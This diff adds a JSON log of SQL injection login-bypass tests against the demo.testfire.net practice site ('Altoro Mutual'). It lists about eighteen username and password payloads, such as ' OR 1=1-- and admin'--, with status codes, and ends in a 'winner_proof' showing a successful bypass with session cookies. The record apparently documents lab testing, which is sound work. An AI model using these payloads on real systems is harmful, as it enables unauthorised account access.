@@ -1,0 +1,221 @@
+{
+ "started": null,
+ "matrix": [
+  {
+   "family": "control-benign",
+   "uid": "ivinvalid7x9",
+   "passw": "wrongpass",
+   "ts": "2026-10-03T15:36:06+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "control-quotebreak",
+   "uid": "'",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:07+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "S1 str-quote",
+   "uid": "' OR '1'='1",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:08+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "S2 str-quote-closed",
+   "uid": "' OR '1'='1'",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:09+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "S3 str-quote-empty",
+   "uid": "' or ''='",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:10+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "S4 str-quote-abc",
+   "uid": "' OR 'abc'='abc'",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:11+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "S5 str+comment--",
+   "uid": "' OR '1'='1'-- ",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:13+02:00",
+   "verdict": "BYPASS->main.jsp",
+   "status": 302,
+   "location": "/bank/main.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "S6 str+comment#",
+   "uid": "' OR '1'='1'#",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:14+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "N1 num+comment--",
+   "uid": "' OR 1=1--",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:15+02:00",
+   "verdict": "BYPASS->main.jsp",
+   "status": 302,
+   "location": "/bank/main.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "N1b num+comment--(emptypass)",
+   "uid": "' OR 1=1--",
+   "passw": "",
+   "ts": "2026-10-03T15:36:16+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "N1c num+comment w/prefix uid=1",
+   "uid": "1' OR 1=1--",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:17+02:00",
+   "verdict": "BYPASS->main.jsp",
+   "status": 302,
+   "location": "/bank/main.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "N2 num+hash#",
+   "uid": "' OR 1=1#",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:19+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "N3 num-noComment",
+   "uid": "' OR 1=1",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:20+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "N4 num-lt-comment",
+   "uid": "' OR 2>1--",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:21+02:00",
+   "verdict": "BYPASS->main.jsp",
+   "status": 302,
+   "location": "/bank/main.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "N5 num-false-control",
+   "uid": "' OR 1=2--",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:22+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "P1 user+comment",
+   "uid": "admin'--",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:23+02:00",
+   "verdict": "BYPASS->main.jsp",
+   "status": 302,
+   "location": "/bank/main.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "P2 user+hash",
+   "uid": "admin'#",
+   "passw": "x",
+   "ts": "2026-10-03T15:36:25+02:00",
+   "verdict": "rejected(302->login.jsp)",
+   "status": 302,
+   "location": "login.jsp",
+   "len": 0,
+   "final_url": null
+  },
+  {
+   "family": "B1 both-fields",
+   "uid": "' OR 1=1--",
+   "passw": "' OR 1=1--",
+   "ts": "2026-10-03T15:36:26+02:00",
+   "verdict": "BYPASS->main.jsp",
+   "status": 302,
+   "location": "/bank/main.jsp",
+   "len": 0,
+   "final_url": null
+  }
+ ],
+ "winner_proof": {
+  "payload": "uid=1' OR 1=1--&passw=x",
+  "ts": "2026-10-03T15:36:28+02:00",
+  "status": 200,
+  "final_url": "http://demo.testfire.net/bank/main.jsp",
+  "len": 7277,
+  "title": "Altoro Mutual",
+  "error_text": null,
+  "cookies": [
+   "JSESSIONID",
+   "AltoroAccounts"
+  ]
+ },
+ "contrast_S1": {
+  "status": 200,
+  "final_url": "http://demo.testfire.net/login.jsp",
+  "len": 8463
+ }
+}
